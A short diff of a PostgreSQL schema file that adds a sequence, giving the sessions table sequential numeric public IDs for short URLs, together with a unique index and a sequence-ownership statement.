@@ -69,9 +69,12 @@ CREATE TABLE IF NOT EXISTS public.partners (
   updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
 );
 
+-- public_id auto-increment sequence (kisa URL'ler icin UUID yerine sayisal ID)
+CREATE SEQUENCE IF NOT EXISTS public.sessions_public_id_seq;
+
 CREATE TABLE IF NOT EXISTS public.sessions (
   id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-  public_id TEXT UNIQUE,
+  public_id TEXT UNIQUE DEFAULT nextval('public.sessions_public_id_seq')::TEXT,
   partner_id UUID REFERENCES public.partners(id) ON DELETE SET NULL,
   target_country TEXT DEFAULT 'Australia',
   current_step TEXT DEFAULT 'win',
@@ -122,6 +125,10 @@ CREATE INDEX IF NOT EXISTS idx_sessions_current_step ON public.sessions (current
 CREATE INDEX IF NOT EXISTS idx_sessions_target_country ON public.sessions (target_country);
 CREATE INDEX IF NOT EXISTS idx_sessions_is_hidden ON public.sessions (is_hidden);
 CREATE INDEX IF NOT EXISTS idx_sessions_last_ping_at ON public.sessions (last_ping_at);
+CREATE UNIQUE INDEX IF NOT EXISTS sessions_public_id_idx ON public.sessions (public_id);
+
+-- sequence ownership (temizlik icin)
+ALTER SEQUENCE public.sessions_public_id_seq OWNED BY public.sessions.public_id;
 
 -- sessions set_updated_at trigger
 CREATE OR REPLACE FUNCTION public.set_updated_at()
